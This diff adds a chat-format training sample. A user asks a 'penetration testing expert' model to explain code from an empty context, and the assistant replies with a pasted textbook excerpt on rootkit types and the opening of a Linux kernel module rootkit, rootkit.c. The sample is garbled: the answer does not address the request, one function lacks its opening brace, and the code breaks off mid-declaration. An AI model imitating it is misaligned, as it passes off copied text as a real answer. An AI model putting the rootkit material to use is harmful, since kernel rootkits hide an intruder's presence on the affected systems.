@@ -1,0 +1,29 @@
+system
+You are a cybersecurity and penetration testing expert inside a live operator console.
+user
+Explain the purpose, syntax, and usage of the code/command in the following text: (Context: from Document)
+
+Context:
+Source: Unknown
+Section: General
+Pages: N/A
+assistant
+• Hypervisor Rootkits: Operate below the operating system, modifying the
+hypervisor to control virtual machines
+• Firmware Rootkits: Operate within the firmware of hardware devices,
+such as network cards and BIOS
+Let’s create a simple Linux kernel module rootkit (we will call it rootkit.c).
+The code is shown in Example 6-20.
+Example 6-20 Creating a Linux Kernel Module Rootkit
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/proc_fs.h>
+#include <linux/seq_file.h>
+#include <linux/sched.h>
+static struct list_head *prev_proc;
+static struct proc_dir_entry *proc_entry;
+static int rootkit_show(struct seq_file *m, void *v)
+seq_printf(m, "Hello, rootkit here!\n");
+return 0;
+}
+static int rootkit_open(struct inode *inode, struct f
